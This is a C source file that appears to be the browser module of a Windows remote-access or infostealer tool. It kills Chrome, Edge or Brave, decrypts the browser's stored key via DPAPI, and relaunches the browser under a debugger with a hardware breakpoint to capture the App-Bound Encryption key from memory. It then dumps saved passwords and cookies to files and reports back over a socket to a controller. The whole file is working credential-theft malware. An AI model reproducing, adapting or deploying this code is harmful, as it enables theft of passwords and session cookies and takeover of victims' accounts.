#include "browser.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <winternl.h>
#include <shlwapi.h>
#include "sqlite3.h"
#include "cJSON.h"
#include "miniz.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

typedef struct {
    const char* name;
    const char* process_name;
    const char* exe_paths[3];
    const char* dll_name;
    const char* user_data_subdir[4];
    const char* output_dir;
    const char* temp_prefix;
    int use_r14;
    int use_roaming;
    int has_abe;
} BrowserConfig;

static BrowserConfig configs[] = {
    {"Chrome", "chrome.exe", {"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL}, "chrome.dll", {"Google", "Chrome", "User Data", NULL}, "chrome_collect", "chrome_tmp", 0, 0, 1},
    {"Edge", "msedge.exe", {"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", NULL}, "msedge.dll", {"Microsoft", "Edge", "User Data", NULL}, "edge_collect", "edge_tmp", 1, 0, 1},
    {"Brave", "brave.exe", {"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL}, "chrome.dll", {"BraveSoftware", "Brave-Browser", "User Data", NULL}, "brave_collect", "brave_tmp", 0, 0, 1},
    {NULL}
};

static int aes_gcm_decrypt(const BYTE* key, const BYTE* iv, const BYTE* tag, const BYTE* ciphertext, DWORD ciphertext_len, BYTE* plaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0); return 0;
    }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, 32, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0); return 0;
    }

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (BYTE*)iv;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (BYTE*)tag;
    authInfo.cbTag = 16;

    DWORD plain_len = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertext_len, &authInfo, NULL, 0, plaintext, ciphertext_len, &plain_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return status == 0;
}

static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, const BYTE* v20_key) {
    if (len <= 15) return NULL;
    BYTE* plain = NULL;
    if (memcmp(blob, "v10", 3) == 0 || memcmp(blob, "v20", 3) == 0) {
        const BYTE* key = (blob[1] == '1') ? v10_key : v20_key;
        if (!key) return NULL;
        plain = malloc(len - 15 + 1);
        if (aes_gcm_decrypt(key, blob + 3, blob + len - 16, blob + 15, len - 31, plain)) {
            plain[len - 31] = 0;
            return plain;
        }
        free(plain);
    } else {
        DATA_BLOB in = { len, (BYTE*)blob };
        DATA_BLOB out = { 0, NULL };
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return out.pbData;
    }
    return NULL;
}

static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len) {
    char path[MAX_PATH];
    _snprintf(path, sizeof(path), "%s\\Local State", user_data_dir);
    FILE* f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    char* buf = malloc(size + 1);
    fread(buf, 1, size, f);
    buf[size] = 0;
    fclose(f);

    cJSON* json = cJSON_Parse(buf);
    free(buf);
    if (!json) return NULL;
    cJSON* crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
    cJSON* enc_key_node = cJSON_GetObjectItemCaseSensitive(crypt, "encrypted_key");
    if (!enc_key_node) { cJSON_Delete(json); return NULL; }

    size_t enc_len;
    BYTE* enc_key = base64_decode(enc_key_node->valuestring, strlen(enc_key_node->valuestring), &enc_len);
    cJSON_Delete(json);

    if (enc_len < 5 || memcmp(enc_key, "DPAPI", 5) != 0) { free(enc_key); return NULL; }

    DATA_BLOB in = { (DWORD)enc_len - 5, enc_key + 5 };
    DATA_BLOB out = { 0, NULL };
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        free(enc_key);
        *out_len = out.cbData;
        return out.pbData;
    }
    free(enc_key);
    return NULL;
}

static void kill_process(const char* name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static size_t find_target_address(HANDLE hProcess, void* base_addr) {
    IMAGE_DOS_HEADER dos;
    SIZE_T read;
    if (!ReadProcessMemory(hProcess, base_addr, &dos, sizeof(dos), &read)) return 0;
    IMAGE_NT_HEADERS64 nt;
    if (!ReadProcessMemory(hProcess, (BYTE*)base_addr + dos.e_lfanew, &nt, sizeof(nt), &read)) return 0;

    DWORD sec_count = nt.FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* sections = malloc(sizeof(IMAGE_SECTION_HEADER) * sec_count);
    ReadProcessMemory(hProcess, (BYTE*)base_addr + dos.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader, sections, sizeof(IMAGE_SECTION_HEADER) * sec_count, &read);

    size_t string_va = 0;
    const char* target = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    for (DWORD i = 0; i < sec_count; i++) {
        if (memcmp(sections[i].Name, ".rdata", 6) == 0) {
            BYTE* data = malloc(sections[i].Misc.VirtualSize);
            ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
            for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - strlen(target)); j++) {
                if (memcmp(data + j, target, strlen(target)) == 0) {
                    string_va = (size_t)base_addr + sections[i].VirtualAddress + j;
                    break;
                }
            }
            free(data);
        }
        if (string_va) break;
    }

    if (!string_va) { free(sections); return 0; }

    size_t target_addr = 0;
    for (DWORD i = 0; i < sec_count; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* data = malloc(sections[i].Misc.VirtualSize);
            ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
            for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - 7); j++) {
                if (data[j] == 0x48 && data[j+1] == 0x8D && data[j+2] == 0x0D) {
                    int offset = *(int*)(data + j + 3);
                    size_t rip = (size_t)base_addr + sections[i].VirtualAddress + j + 7;
                    if (rip + offset == string_va) {
                        target_addr = (size_t)base_addr + sections[i].VirtualAddress + j;
                        break;
                    }
                }
            }
            free(data);
        }
        if (target_addr) break;
    }

    free(sections);
    return target_addr;
}

static void set_hw_bp(DWORD tid, size_t addr) {
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) return;
    SuspendThread(hThread);
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);
    ctx.Dr0 = addr;
    ctx.Dr7 = (ctx.Dr7 & ~3) | 1;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    CloseHandle(hThread);
}

static void dump_sqlite_table(sqlite3* db, const char* query, FILE* out, const char* label, const BYTE* v10, const BYTE* v20) {
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
        int cols = sqlite3_column_count(stmt);
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            fprintf(out, "[%s]\n", label);
            for (int i = 0; i < cols; i++) {
                const char* name = sqlite3_column_name(stmt, i);
                if (sqlite3_column_type(stmt, i) == SQLITE_BLOB) {
                    int len = sqlite3_column_bytes(stmt, i);
                    const BYTE* blob = sqlite3_column_blob(stmt, i);
                    BYTE* dec = decrypt_blob(blob, len, v10, v20);
                    if (dec) {
                        fprintf(out, "%s: %s\n", name, dec);
                        free(dec);
                    }
                } else {
                    const char* val = (const char*)sqlite3_column_text(stmt, i);
                    fprintf(out, "%s: %s\n", name, val ? val : "NULL");
                }
            }
            fprintf(out, "---\n");
        }
        sqlite3_finalize(stmt);
    }
}

static void extract_from_profile(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20) {
    char db_path[MAX_PATH], out_file[MAX_PATH];
    sqlite3* db;

    // Passwords
    _snprintf(db_path, sizeof(db_path), "%s\\Login Data", profile_path);
    _snprintf(out_file, sizeof(out_file), "%s\\passwords.txt", out_dir);
    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
        FILE* f = fopen(out_file, "a");
        if (f) { dump_sqlite_table(db, "SELECT origin_url, username_value, password_value FROM logins", f, "LOGIN", v10, v20); fclose(f); }
        sqlite3_close(db);
    }

    // Cookies
    _snprintf(db_path, sizeof(db_path), "%s\\Network\\Cookies", profile_path);
    _snprintf(out_file, sizeof(out_file), "%s\\cookies.txt", out_dir);
    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
        FILE* f = fopen(out_file, "a");
        if (f) { dump_sqlite_table(db, "SELECT host_key, name, encrypted_value FROM cookies", f, "COOKIE", v10, v20); fclose(f); }
        sqlite3_close(db);
    }
}

void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
    BrowserConfig* config = NULL;
    for (int i = 0; configs[i].name != NULL; i++) {
        if (_stricmp(configs[i].name, browser_name) == 0) { config = &configs[i]; break; }
    }
    if (!config) { sock_send(sock, mutex, "[browser_zip_err]Unknown browser"); return; }

    kill_process(config->process_name);

    char user_data[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%", user_data, MAX_PATH);
    for(int i=0; config->user_data_subdir[i]; i++) {
        strcat(user_data, "\\");
        strcat(user_data, config->user_data_subdir[i]);
    }

    DWORD v10_len = 0;
    BYTE* v10_key = get_v10_key(user_data, &v10_len);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[MAX_PATH];
    _snprintf(cmd, sizeof(cmd), "\"%s\" --no-first-run", config->exe_paths[0]);

    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        sock_send(sock, mutex, "[browser_zip_err]CreateProcess failed");
        if (v10_key) LocalFree(v10_key);
        return;
    }

    DEBUG_EVENT de;
    size_t target_addr = 0;
    BYTE v20_key[32];
    int success = 0;

    while (WaitForDebugEvent(&de, 10000)) {
        if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
            char path[MAX_PATH];
            GetFinalPathNameByHandle(de.u.LoadDll.hFile, path, MAX_PATH, 0);
            if (strstr(path, config->dll_name)) {
                target_addr = find_target_address(pi.hProcess, de.u.LoadDll.lpBaseOfDll);
                if (target_addr) set_hw_bp(pi.dwThreadId, target_addr);
            }
        } else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            if (de.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
                if ((size_t)de.u.Exception.ExceptionRecord.ExceptionAddress == target_addr) {
                    CONTEXT ctx = { 0 };
                    ctx.ContextFlags = CONTEXT_FULL;
                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, de.dwThreadId);
                    GetThreadContext(hThread, &ctx);
                    size_t key_ptr = config->use_r14 ? ctx.R14 : ctx.R15;
                    ReadProcessMemory(pi.hProcess, (void*)key_ptr, v20_key, 32, NULL);
                    success = 1;
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(hThread);
                }
            }
        } else if (de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
            break;
        }
        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
        if (success) break;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success || v10_key) {
        char out_dir[MAX_PATH];
        sprintf(out_dir, "%s\\extract", user_data);
        CreateDirectory(out_dir, NULL);
        char profile[MAX_PATH];
        sprintf(profile, "%s\\Default", user_data);
        extract_from_profile(profile, out_dir, v10_key, success ? v20_key : NULL);
        sock_send(sock, mutex, "[browser_zip_err]Extraction complete in temp folder");
    } else {
        sock_send(sock, mutex, "[browser_zip_err]Failed to find keys");
    }
    if (v10_key) LocalFree(v10_key);
}
